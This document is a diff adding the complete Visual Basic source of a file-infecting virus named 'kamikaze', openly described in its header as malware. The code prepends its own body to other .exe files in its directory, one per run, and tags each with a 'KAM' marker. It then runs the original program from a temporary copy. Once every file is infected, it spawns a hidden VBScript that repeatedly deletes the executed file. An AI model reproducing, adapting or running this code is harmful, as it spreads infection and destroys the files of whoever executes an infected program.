@@ -1,0 +1,125 @@
+   '\\\kamikaze\\\
+
+   'infects exe files in current directory.. one infection per cycle..
+
+   'when all exe files in current directory are infected, every executed infected file
+   'will be deleted by a spawned vbscript..
+
+   'enjoy
+
+   'alcopaul
+
+
+   Attribute VB_Name = "Module1"
+   Option Explicit
+   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
+   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
+   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
+   Private iResult As Long
+   Private hProg As Long
+   Private idProg As Long
+   Private iExit As Long
+   Const STILL_ACTIVE As Long = &H103
+   Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
+   Sub Main()
+   On Error Resume Next
+   Dim vdir As String
+   Dim sfile As String
+   Dim a As String
+   Dim aa As String
+   Dim arr1
+   Dim lenhost As String
+   Dim vc As String
+   Dim mark As String
+   Dim host
+   Dim hdlen As String
+   Dim hostlen As String
+   Dim virlen As String
+   Dim buffhdlen As String
+   Dim buffhostlen As String
+   Dim buffvirlen As String
+   Dim lost As String
+   vdir = App.Path
+   If Right(vdir, 1) <> "\" Then vdir = vdir & "\"
+   sfile = Dir$(vdir & "*.exe")
+   While sfile <> ""
+   a = a & sfile & "/"
+   sfile = Dir$
+   Wend
+   arr1 = Split(a, "/")
+   For Each host In arr1
+   If host = "" Then
+   aa = "On Error Resume Next" & vbCrLf & _
+   "Set fso = CreateObject(" & """" & "scripting.filesystemobject" & """" & ")" & vbCrLf & _
+   "Do While fso.fileexists(" & """" & vdir & App.EXEName & ".exe" & """" & ") = True" & vbCrLf & _
+   "fso.deletefile " & """" & vdir & App.EXEName & ".exe" & """" & ", True" & vbCrLf & _
+   "Loop"
+   Open vdir & "kamikaze.vbs" For Output As #1
+   Print #1, aa
+   Close #1
+   Shell "wscript.exe " & vdir & "kamikaze.vbs", vbHide
+   Exit For
+   End If
+   Open vdir & host For Binary Access Read As #1
+   lenhost = (LOF(1))
+   vc = Space(lenhost)
+   Get #1, , vc
+   Close #1
+   mark = Right(vc, 3)
+   If mark <> "KAM" Then
+   GoTo notinfected
+   Else
+   GoTo gggoop
+   End If
+   notinfected:
+   virustime (vdir & host)
+   Exit For
+   gggoop:
+   Next host
+   Open vdir & App.EXEName & ".exe" For Binary Access Read As #1
+   buffhostlen = Space(LOF(1) - 6144)
+   buffvirlen = Space(6144)
+   Get #1, , buffvirlen
+   Get #1, , buffhostlen
+   Close #1
+   Open vdir & "kam.exe" For Binary Access Write As #3
+   Put #3, , buffhostlen
+   Close #3
+   'borrowed from murkry's vb5 virus
+   idProg = Shell(vdir & "kam.exe " & Command, vbNormalFocus)
+   hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
+   GetExitCodeProcess hProg, iExit
+   Do While iExit = STILL_ACTIVE
+   DoEvents
+   GetExitCodeProcess hProg, iExit
+   Loop
+   Kill vdir & "kam.exe"
+   End Sub
+   Function virustime(hostpath As String)
+   On Error Resume Next
+   Dim ffile
+   Dim hostcode As String
+   Dim vir As String
+   Dim vircode As String
+   Dim header As String
+   Dim lost As String
+   Dim a1 As String
+   vir = App.Path
+   If Right(vir, 1) <> "\" Then vir = vir & "\"
+   Open hostpath For Binary Access Read As #1
+   hostcode = Space(LOF(1))
+   Get #1, , hostcode
+   Close #1
+   Open vir & App.EXEName & ".exe" For Binary Access Read As #2
+   vircode = Space(6144)
+   lost = Space(LOF(2) - 6144)
+   Get #2, , vircode
+   Get #2, , lost
+   Close #2
+   a1 = "KAM"
+   Open hostpath For Binary Access Write As #3
+   Put #3, , vircode
+   Put #3, , hostcode
+   Put #3, , a1
+   Close #3
+   End Function
